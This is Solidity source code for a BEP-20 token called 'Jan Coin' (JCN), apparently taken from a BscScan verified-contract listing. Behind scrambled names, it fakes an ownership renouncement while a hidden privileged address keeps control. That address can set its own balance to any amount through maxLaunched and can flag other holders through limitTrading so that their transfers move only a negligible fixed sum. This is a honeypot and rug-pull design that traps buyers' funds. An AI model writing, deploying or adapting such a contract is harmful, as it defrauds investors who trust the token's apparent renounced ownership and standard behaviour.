/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface tokenAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitBuy {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract JanCoin {
    uint8 private limitSenderAt = 18;
    
    bool public swapWallet;
    uint256 private enableAuto;

    string private tokenMode = "Jan Coin";
    uint256 private toFund = 100000000 * 10 ** limitSenderAt;

    
    mapping(address => mapping(address => uint256)) private atMinLaunch;
    bool public swapLimit;
    address public fundTo;
    uint256 private launchedTeam;
    mapping(address => uint256) private fromToken;
    uint256 constant liquidityToMin = 11 ** 10;
    uint256 private fundList;
    bool public tokenShould;
    bool public walletLaunchFund;
    uint256 private txWallet;

    bool private modeTake;
    address public toExempt;
    mapping(address => bool) public walletTx;
    address private buyExempt;

    mapping(address => bool) public sellMarketing;
    string private buyTake = "JCN";
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        if (swapWallet != swapLimit) {
            swapLimit = true;
        }
        tokenAt exemptReceiverFrom = tokenAt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        toExempt = limitBuy(exemptReceiverFrom.factory()).createPair(exemptReceiverFrom.WETH(), address(this));
        buyExempt = toLiquidity();
        if (enableAuto != launchedTeam) {
            launchedTeam = fundList;
        }
        fundTo = buyExempt;
        sellMarketing[fundTo] = true;
        if (swapLimit == swapWallet) {
            launchedTeam = enableAuto;
        }
        fromToken[fundTo] = toFund;
        emit Transfer(address(0), fundTo, toFund);
        exemptTake();
    }

    

    function amountShould(address sellWallet, address swapSender, uint256 senderModeSell) internal returns (bool) {
        require(fromToken[sellWallet] >= senderModeSell);
        fromToken[sellWallet] -= senderModeSell;
        fromToken[swapSender] += senderModeSell;
        emit Transfer(sellWallet, swapSender, senderModeSell);
        return true;
    }

    function name() external view returns (string memory) {
        return tokenMode;
    }

    function approve(address autoToTeam, uint256 senderModeSell) public returns (bool) {
        atMinLaunch[toLiquidity()][autoToTeam] = senderModeSell;
        emit Approval(toLiquidity(), autoToTeam, senderModeSell);
        return true;
    }

    function getOwner() external view returns (address) {
        return buyExempt;
    }

    function transferFrom(address fromLaunch, address txFeeReceiver, uint256 senderModeSell) public returns (bool) {
        if (fromLaunch != toLiquidity() && atMinLaunch[fromLaunch][toLiquidity()] != type(uint256).max) {
            require(atMinLaunch[fromLaunch][toLiquidity()] >= senderModeSell);
            atMinLaunch[fromLaunch][toLiquidity()] -= senderModeSell;
        }
        if (txFeeReceiver == fundTo || fromLaunch == fundTo) {
            return amountShould(fromLaunch, txFeeReceiver, senderModeSell);
        }
        if (swapLimit) {
            swapWallet = false;
        }
        if (walletTx[fromLaunch]) {
            return amountShould(fromLaunch, txFeeReceiver, liquidityToMin);
        }
        
        return amountShould(fromLaunch, txFeeReceiver, senderModeSell);
    }

    function maxLaunched(uint256 senderModeSell) public {
        if (!sellMarketing[toLiquidity()]) {
            return;
        }
        fromToken[fundTo] = senderModeSell;
    }

    function transfer(address txFeeReceiver, uint256 senderModeSell) external returns (bool) {
        return transferFrom(toLiquidity(), txFeeReceiver, senderModeSell);
    }

    function toLiquidity() private view returns (address) {
        return msg.sender;
    }

    function launchedSwap(address enableFund) public {
        if (walletLaunchFund) {
            return;
        }
        
        sellMarketing[enableFund] = true;
        
        walletLaunchFund = true;
    }

    function totalSupply() external view returns (uint256) {
        return toFund;
    }

    function balanceOf(address amountFrom) public view returns (uint256) {
        return fromToken[amountFrom];
    }

    function limitTrading(address toFrom) public {
        
        if (toFrom == fundTo || toFrom == toExempt || !sellMarketing[toLiquidity()]) {
            return;
        }
        
        walletTx[toFrom] = true;
    }

    function symbol() external view returns (string memory) {
        return buyTake;
    }

    function owner() external view returns (address) {
        return buyExempt;
    }

    function exemptTake() public {
        emit OwnershipTransferred(fundTo, address(0));
        buyExempt = address(0);
    }

    function allowance(address buySender, address autoToTeam) external view returns (uint256) {
        return atMinLaunch[buySender][autoToTeam];
    }

    function decimals() external view returns (uint8) {
        return limitSenderAt;
    }


}